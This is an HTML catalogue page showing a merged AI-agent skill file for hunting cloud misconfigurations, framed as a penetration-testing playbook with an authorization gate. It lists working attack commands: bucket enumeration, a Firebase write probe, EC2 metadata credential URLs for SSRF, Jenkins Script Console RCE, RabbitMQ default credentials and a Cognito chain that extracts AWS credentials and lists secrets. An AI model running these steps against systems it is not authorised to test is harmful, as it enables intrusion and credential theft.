@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-cloud-misconfig</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">cloud-misconfig-hunt</a> / hunt-cloud-misconfig</p><h1>hunt-cloud-misconfig</h1><p class="meta">combined</p><p>The two copies share the same core procedure (S3/GCS/Blob listing, Firebase open rules, EC2 metadata via SSRF, exposed admin panels, LocalStack verification, and CloudWatch RUM weaponization), but each contains material steps the other lacks. The uphiago copy adds a detailed RUM attack chain (Cognito get-id/get-credentials-for-identity, STS enumeration, pacu) and a truncated Chain B, plus a more detailed description of detection surfaces. The sickn33 copy adds a mandatory authorization confirmation gate, Jenkins SSO-restriction failure to Script Console RCE, and exposed RabbitMQ/AMQP default-credential probing. Because crowning one would hide the other&#x27;s unique steps and the sickn33 copy imposes a safety gate the uphiago copy does not, the correct decision is combine.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-cloud-misconfig/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-cloud-misconfig/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-cloud-misconfig/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-cloud-misconfig/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-cloud-misconfig/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-cloud-misconfig/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-cloud-misconfig
+description: Hunt cloud / infrastructure misconfigurations across AWS, GCP, and Azure.
+category: security
+risk: offensive
+license: MIT
+---
+
+# HUNT-CLOUD-MISCONFIG — Cloud / Infrastructure Misconfigurations
+
+## Authorization Gate
+Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+1. Ask the user to state the exact target URL, IP, account, or resource.
+2. Ask the user to confirm written authorization and the permitted scope.
+3. Show the exact command(s) and explain their expected effect.
+4. Wait for explicit confirmation in the current conversation.
+
+Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## Crown Jewel Targets
+
+### S3 / GCS / Azure Blob
+```bash
+# S3 listing
+curl --max-time 30 --connect-timeout 10 -s &quot;https://TARGET-NAME.s3.amazonaws.com/?max-keys=10&quot;
+aws s3 ls s3://target-bucket-name --no-sign-request
+
+# Try common bucket names
+for name in target target-backup target-assets target-prod target-staging; do
+  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w &quot;$name: %{http_code}\n&quot; &quot;https://$name.s3.amazonaws.com/&quot;
+done
+
+# Firebase open rules
+curl --max-time 30 --connect-timeout 10 -s &quot;https://TARGET-APP.firebaseio.com/.json&quot;   # read
+curl --max-time 30 --connect-timeout 10 -s -X PUT &quot;https://TARGET-APP.firebaseio.com/test.json&quot; -d &#x27;&quot;pwned&quot;&#x27;  # write
+```
+
+### EC2 Metadata (via SSRF)
+```bash
+http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
+```
+
+### Exposed Admin Panels
+```
+/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
+/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
+```
+
+### Jenkins SSO-restriction failure → Script Console RCE
+An exposed Jenkins that authenticates ANY personal Google/OAuth account (missing org-domain restriction) is full compromise: log in, then `/script` (Groovy console) = RCE, and `/credentials` + `/scriptText` = stored API tokens and source disclosure.
+
+### Exposed message broker (RabbitMQ / AMQP) with default creds
+Probe RabbitMQ management (`http://TARGET:15672/`, API `:15672/api/overview`) and AMQP `:5672`; try default `guest:guest` (works off-localhost when `loopback_users` is misconfigured) → queue/message read, vhost enumeration, management-plugin admin.
+
+## Local-verification toolchain
+
+For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:
+
+```bash
+# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
+docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0
+
+# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
+export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
+export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
+export AWS_ENDPOINT_URL=http://localhost:14566
+export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
+```
+
+Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team.
+
+## CloudWatch RUM Weaponization (2024-2026 surface)
+
+AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.&lt;region&gt;.amazonaws.com`. The snippet&#x27;s `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) — both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine.
+
+### Detection — JS bundle fingerprints
+
+**Snippet-style (most common, embedded in `&lt;head&gt;`):**
+```javascript
+(function(n,i,v,r,s,c,x,z){...})(
+  &#x27;cwr&#x27;,
+  &#x27;00000000-0000-0000-0000-000000000000&#x27;,                       // applicationId (UUID)
+  &#x27;1.0.0&#x27;,
+  &#x27;us-east-1&#x27;,
+  &#x27;https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js&#x27;,
+  {
+    sessionSampleRate: 1,
+    guestRoleArn: &quot;arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth&quot;,
+    identityPoolId: &quot;us-east-1:abcd1234-...&quot;,
+    endpoint: &quot;https://dataplane.rum.us-east-1.amazonaws.com&quot;,
+    telemetries: [&quot;errors&quot;,&quot;performance&quot;,&quot;http&quot;]
+  }
+);
+```
+
+**NPM-style (aws-rum-web package):**
+```javascript
+import { AwsRum, AwsRumConfig } from &#x27;aws-rum-web&#x27;;
+const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
+const awsRum = new AwsRum(APPLICATION_ID, &#x27;1.0.0&#x27;, AWS_REGION, config);
+```
+
+### Regex set for recon
+
+```bash
+# Detect RUM init
+grep -REn &quot;cwr\([&#x27;\&quot;]init[&#x27;\&quot;]|from\s+[&#x27;\&quot;]aws-rum-web[&#x27;\&quot;]|new\s+AwsRum\(&quot; .
+
+# Extract applicationId (UUID v4)
+grep -ErohE &quot;applicationId[&#x27;\&quot;]?\s*[:=]\s*[&#x27;\&quot;]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})[&#x27;\&quot;]&quot; .
+
+# Extract identityPoolId (region:UUID)
+grep -ErohE &quot;identityPoolId[&#x27;\&quot;]?\s*[:=]\s*[&#x27;\&quot;]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})[&#x27;\&quot;]&quot; .
+
+# Extract guestRoleArn (leaks AWS account ID + role name)
+grep -ErohE &quot;guestRoleArn[&#x27;\&quot;]?\s*[:=]\s*[&#x27;\&quot;]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+[&#x27;\&quot;]&quot; .
+
+# Endpoint reveals region
+grep -ErohE &quot;dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com&quot; .
+```
+
+### Attack chains
+
+**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:
+
+```bash
+aws cognito-identity get-id \
+  --identity-pool-id &quot;us-east-1:abcd1234-...&quot; \
+  --region us-east-1 --no-sign-request
+aws cognito-identity get-credentials-for-identity \
+  --identity-id &quot;us-east-1:&lt;returned-uuid&gt;&quot; \
+  --region us-east-1 --no-sign-request
+# → STS creds; export and:
+aws sts get-caller-identity        # confirm role
+aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
+# Automate: pacu / enumerate-iam.py
+```
+
+Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.
+
+**Chain B — Telemetry endpoint compromise.** (See source for full details.)
+
+## Detection Surfaces
+- Targeted dorking
+- Certificate transparency
+- JS bundle secret extraction
+- Port scan for known service ports
+
+## Validation
+- Actual data read / write / RCE
+
+## Scope Boundaries
+- Kubernetes/Docker exposure is owned by hunt-k8s
+- CI/CD pipeline attacks by hunt-cicd
+- Post-credential IAM escalation by cloud-iam-deep</pre>
+</body>
+</html>
